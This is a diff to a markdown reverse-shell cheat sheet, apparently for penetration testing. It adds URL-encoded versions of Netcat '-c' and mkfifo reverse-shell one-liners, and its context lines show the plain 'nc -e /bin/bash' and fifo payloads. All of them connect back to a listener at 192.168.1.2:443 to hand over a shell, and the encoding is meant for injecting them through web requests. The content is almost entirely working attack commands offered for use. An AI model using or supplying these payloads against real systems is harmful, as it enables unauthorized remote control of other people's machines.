@@ -7,8 +7,9 @@
       * [<kbd>-e</kbd>](#-e)
       * [<kbd>-e (URL Encode)</kbd>](#-e-URL-Encode)
       * [<kbd>-c</kbd>](#-c)
+      * [<kbd>-c (URL Encode)</kbd>](#-c-URL-Encode)
       * [<kbd>fifo</kbd>](#fifo)
-      * [<kbd>fifo [URL Encode]</kbd>](#fifo-[URL-Encode])
+      * [<kbd>fifo (URL Encode)</kbd>](#fifo-URL-Encode)
   * [<kbd>Netcat Windows</kbd>](#Netcat-Windows)
   * [<kbd>Netcat URL Encoding</kbd>](#Netcat-URL-Encoding)
   * [<kbd>Netcat Base64 Encoding</kbd>](#Netcat-Base64-Encoding)
@@ -122,6 +123,7 @@
   ```cmd 
   nc -e /bin/bash 192.168.1.2 443
   ```
+ 
   # <kbd>-e URL Encode</kbd>
  
   ```cmd
@@ -142,12 +144,28 @@
   nc -c /bin/bash 192.168.1.2 443
   ```
  
+  # <kbd>-c URL Encode</kbd>
+ 
+  ```cmd
+  nc%20-c%20%2Fbin%2Fsh%20192.168.1.2%20443
+  ```
+ 
+  ```cmd
+  nc%20-c%20%2Fbin%2Fbash%20192.168.1.2%20443
+  ```
+ 
   # <kbd>fifo</kbd>
   
   ```cmd
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
   ```
   
+  # <kbd>fifo URL Encode</kbd>
+ 
+  ```cmd
+  rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
+  ```
+ 
   ---
   
   # <kbd>Netcat Windows</kbd>
